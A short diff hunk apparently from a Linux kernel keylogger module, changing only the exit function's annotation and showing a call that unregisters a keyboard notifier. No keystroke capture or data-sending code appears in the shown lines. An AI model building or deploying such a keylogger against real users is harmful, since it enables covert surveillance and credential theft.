@@ -91,7 +91,7 @@ int __init keylogger_module_init(void)
 	return 0;
 }
 
-void __exit keylogger_module_exit(void)
+void keylogger_module_exit(void)
 {
 	int result = unregister_keyboard_notifier(&keyboard_notifier_block);
 
